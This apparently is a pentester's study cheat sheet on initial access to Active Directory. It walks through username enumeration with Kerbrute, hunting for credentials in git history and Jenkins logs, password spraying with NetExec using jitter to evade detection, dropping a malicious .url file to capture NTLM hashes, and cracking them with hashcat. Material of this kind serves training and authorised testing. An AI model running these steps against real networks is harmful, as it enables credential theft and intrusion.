# AD Breaching — Cheat Sheet

> Phase: **Initial Access / Credential Acquisition**
> Goal: obtain the *first* valid set of AD credentials to begin enumeration.

## Variables used

| Placeholder | Meaning |
|---|---|
| `<DC_IP>` | Domain Controller IP |
| `<DOMAIN>` | Fully qualified domain, e.g. `corp.local` |
| `<USER>` | Known/target username |
| `<PASS>` | Known/target password |
| `<USERLIST>` | Path to username wordlist |
| `<PASSLIST>` | Path to password wordlist |
| `<SHARE>` | SMB share name |
| `<JOB_NAME>` | Jenkins job name |
| `<URL>` | Target web URL |

---

## 1. Concept

AD breaching = getting **one** valid credential (even low-priv) from zero access.

- Any authenticated account can query AD: users, groups, computers, GPOs, trusts.
- This enumeration usually reveals the path to Domain Admin.
- **Hardest part = the first foothold.**

### Starting positions

| Position | Description |
|---|---|
| **Black-box (unauthenticated)** | Network access only, no creds → enumerate/spray/coerce |
| **Grey-box (authenticated)** | Already hold low-priv creds → skip to enumeration |

---

## 2. AD Attack Surface

| Service | Port | Use |
|---|---|---|
| SMB | 445/TCP | File shares, spraying target, printer/admin access |
| LDAP | 389/636 TCP | Directory queries; may leak stored creds on misconfigured devices |
| HTTP/HTTPS | 80/443 | Portals, device mgmt UIs, CI/CD — creds in logs/configs/repos |
| Kerberos | 88/TCP | Auth protocol; pre-auth abuse → username enumeration |
| DNS | 53/TCP+UDP | Resolve DCs, mail servers, infra |

---

## 3. DNS Enumeration

```bash
# Domain controllers via SRV
nslookup -type=SRV _ldap._tcp.dc._msdcs.<DOMAIN> <DC_IP>

# Kerberos KDC
nslookup -type=SRV _kerberos._tcp.<DOMAIN> <DC_IP>

# Mail servers
nslookup -type=MX <DOMAIN> <DC_IP>
```

---

## 4. Username Enumeration — Kerbrute

**Mechanism:** Kerberos AS-REQ pre-auth behavior.

- Invalid user → `KDC_ERR_C_PRINCIPAL_UNKNOWN`
- Valid user → KDC requests pre-auth (confirms existence)

✅ Does **not** trigger lockouts (not counted as failed logon)
⚠️ Still generates **Event ID 4768** on the DC (not silent)

```bash
# Validate usernames
kerbrute userenum -d <DOMAIN> --dc <DC_IP> <USERLIST>

# Save valid hits to file
kerbrute userenum -d <DOMAIN> --dc <DC_IP> <USERLIST> -o valid_users.txt
```

### Clean up Kerbrute output for spraying

```bash
grep "VALID USERNAME" valid_users.txt | awk '{print $NF}' | sed 's/@<DOMAIN>//' > clean_users.txt
```

---

## 5. Credential Hunting — Git Repositories

Secrets removed from HEAD often remain in commit history.

**Look in:**
- Commit history (temp-committed creds)
- Config files: `.env`, `web.config`, `appsettings.json`, `config.php`, `database.yml`
- Hardcoded secrets in source
- CI/CD defs: `Jenkinsfile`, `.gitlab-ci.yml`, `.github/workflows/*.yml`

```bash
# Manual grep through full diff history
git log -p | grep -i "password\|secret\|token\|key\|credential"

# Automated scan (commit history, high-entropy strings)
trufflehog git file:///path/to/repo
```

---

## 6. Credential Hunting — Jenkins

Often weak/default creds (`admin:admin`) or **no auth at all**.

**Leak points:**
- Build console output (env vars, conn strings — `****` mask can be bypassed via Groovy string interpolation)
- Job config XML (`config.xml`) — esp. legacy jobs
- Exposed environment variables in build steps
- Workspace files (source/config/artifacts)

```bash
# Pull build log via API and grep for creds
curl http://<URL>/job/<JOB_NAME>/lastBuild/consoleText | grep -i "password\|secret\|token\|credential"
```

---

## 7. Password Spraying

### 7.1 Check lockout policy FIRST (if you have 1 valid cred)

```bash
nxc smb <DC_IP> -u '<USER>' -p '<PASS>' --pass-pol
```

> Rule of thumb: if lockout = 5 attempts / 30 min window, spray **one password at a time**, wait out the window before trying the next.

### 7.2 Spray with NetExec (nxc)

```bash
nxc smb <DC_IP> -u clean_users.txt -p '<PASS>' --continue-on-success
```

| Flag | Meaning |
|---|---|
| `smb` | Protocol (also supports: ldap, winrm, rdp, mssql) |
| `-u <USERLIST>` | Usernames, one per line |
| `-p '<PASS>'` | Single password to spray against all users |
| `--continue-on-success` | Don't stop at first hit — keep testing full list |
| `--jitter 2-5` | Random delay between attempts (reduce lockout/detection risk) |

```bash
# with jitter
nxc smb <DC_IP> -u clean_users.txt -p '<PASS>' --continue-on-success --jitter 2-5
```

⚠️ `STATUS_ACCOUNT_LOCKED_OUT` on any result → **stop immediately** and investigate.

---

## 8. SMB Share Abuse — Hash Capture via Malicious .url

Upload a crafted `.url`/`.scf`/`.lnk` file to a **writable** share to coerce an SMB auth attempt (capture NTLM hash via Responder/listener).

```bash
# Connect & upload to writable share
smbclient //<DC_IP or HOST>.<DOMAIN>/<SHARE> -U '<DOMAIN>\<USER>%<PASS>'
# then: put evil.url
```

### Crack the captured hash

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
```

> `-m 5600` = NetNTLMv2. Use `-m 5500` for NetNTLMv1.

---

## 9. Quick Workflow Summary

```
1. DNS enum           → identify DCs / mail servers
2. Kerbrute userenum   → validate OSINT username list
3. Clean output        → clean_users.txt
4. Git / Jenkins hunt  → look for leaked creds in parallel
5. Check pass policy   → (if any single cred known)
6. Spray (1 pw, jitter)→ watch for lockouts
7. Writable share drop → coerce hash → crack offline
```
